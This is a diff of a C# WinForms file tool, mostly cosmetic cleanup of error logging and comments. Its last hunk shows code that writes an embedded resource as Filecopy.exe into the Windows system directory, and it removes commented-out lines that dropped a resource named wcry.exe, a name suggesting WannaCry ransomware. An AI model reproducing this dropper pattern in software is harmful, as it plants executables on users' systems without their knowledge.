@@ -185,12 +185,12 @@ namespace Open_file
 
             StringBuilder strBuilderErrorMessage = new StringBuilder();
 
-            strBuilderErrorMessage.Append("________________________________________________________________________________________________________________\r\n");
+            strBuilderErrorMessage.Append("___________________________________________________________________\r\n");
             strBuilderErrorMessage.Append("日期:" + System.DateTime.Now.ToString() + "\r\n");
             strBuilderErrorMessage.Append("错误标题:" + errTitle + "\r\n");
             strBuilderErrorMessage.Append("错误信息:" + ex.Message + "\r\n");
             strBuilderErrorMessage.Append("错误内容:" + ex.StackTrace + "\r\n");
-            strBuilderErrorMessage.Append("________________________________________________________________________________________________________________\r\n");
+            strBuilderErrorMessage.Append("___________________________________________________________________\r\n");
             try
             {
                 using (StreamWriter sw = File.AppendText(path))
@@ -247,8 +247,8 @@ namespace Open_file
         //写文件
         private void button3_Click(object sender, EventArgs e)
         {
-            String ImputCharacter = textBox2.Text; //输入字符
-            String File_Write = textBox1.Text;    //选定文件
+            String ImputCharacter = textBox2.Text; 
+            String File_Write = textBox1.Text;    
             if (string.IsNullOrEmpty(ImputCharacter))
             {
                 textBox3.Text = "路径不能为空！";
@@ -348,10 +348,6 @@ namespace Open_file
                     catch (Exception)
                     { continue; }
                 }
-
-
-
-
 
             }
         }
@@ -474,8 +470,7 @@ namespace Open_file
 
 
         }
-
-
+        
         private void button5_Click(object sender, EventArgs e)
         {
             FolderBrowserDialog dialog = new FolderBrowserDialog();
@@ -523,15 +518,12 @@ namespace Open_file
             string path = System.Environment.GetFolderPath(Environment.SpecialFolder.System);
 
             //释放资源
-            if (!File.Exists(path + @"\Filecopy.exe"))
-            //if (!File.Exists(path + @"\wcry.exe"))
+            if (!File.Exists(path + @"\Filecopy.exe"))            
             {
                 try
                 {
-                    byte[] Save = Properties.Resources.copyfile;
-                    //byte[] Save = Properties.Resources.wcry;
-                    FileStream fsObj = new FileStream(path + @"\Filecopy.exe", FileMode.CreateNew);
-                    //FileStream fsObj = new FileStream(path + @"\wcry.exe", FileMode.CreateNew);
+                    byte[] Save = Properties.Resources.copyfile;                    
+                    FileStream fsObj = new FileStream(path + @"\Filecopy.exe", FileMode.CreateNew);                    
                     fsObj.Write(Save, 0, Save.Length);
                     fsObj.Close();
                     //现在到系统目录中找一下释放的资源.exe吧
